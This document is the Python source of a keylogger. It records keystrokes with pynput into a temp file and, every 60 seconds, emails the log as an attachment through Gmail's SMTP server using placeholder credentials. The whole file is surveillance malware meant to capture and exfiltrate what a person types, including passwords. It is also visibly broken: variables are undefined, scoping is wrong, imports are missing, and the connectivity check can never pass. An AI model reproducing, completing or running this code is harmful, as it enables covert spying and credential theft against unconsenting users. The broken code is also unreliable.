
# All imports
from pynput.keyboard import Listener #1
import smtplib #2
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket #3
import tempfile #4
from datetime import date #5

# functions
def writetofile(key):
    char = str(key)
    char = char.replace("'", "")
    # replacing keystrokes in file.txt with actual meaning
    keystroke = ['Key.shift', 'Key.space', 'Key.enter', 'Key.backspace','Key.ctrl_l']
    value = ["", " ", "\n", '<backspace>', '']
    for j in range(len(keystroke)):
        if keystroke[j] == char:
            char = char.replace(keystroke[j], value[j])
    with open(filename, 'a') as f:
        f.write(char)
        
def emailsender():
    fromadd = "my_email"
    toadd = "my_email"

    msg = MIMEMultipart()

    msg['From'] = fromadd
    msg['To'] = toadd
    msg['Subject'] = 'Keylogger' # add subject here

    msg.attach(MIMEText('log', 'plain')) # write body here

    #extension imp
    attachment = open(filename, 'rb')

    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)

    smtpobj = smtplib.SMTP('smtp.gmail.com', 587)
    smtpobj.ehlo()
    smtpobj.starttls()
    smtpobj.login(fromadd ,'my_password') # add password 
    text = msg.as_string()
    smtpobj.sendmail(fromadd , toadd , text)
    smtpobj.quit() 
    
def is_connected(): 
    try:
        host = socket.gethostbyname(hostname)
        s = socket.create_connection((host, 80), 2)
        s.close()
        print(True)
    except:
        pass
        print(False)
        
def filecreation():
    filename = save + '\\keylg' + '.txt'
    a = open (filename, "w+")
    a.write(str(date.today())) 

# main    
save = tempfile.mkdtemp('file') 
print (save)
filecreation()

if is_connected() == True:
    def join():
        with Listener(on_press=writetofile) as ls:
            def time_out(period_sec: int):
                time.sleep(period_sec)  # Listen to keyboard for period_sec seconds
                ls.stop()
                emailsender()
                os.remove(filename)
                filecreation()
                
            Thread(target=time_out, args=(60.0,)).start() #listening for 60 seconds. 
            ls.join()
    
    while True:
        join()
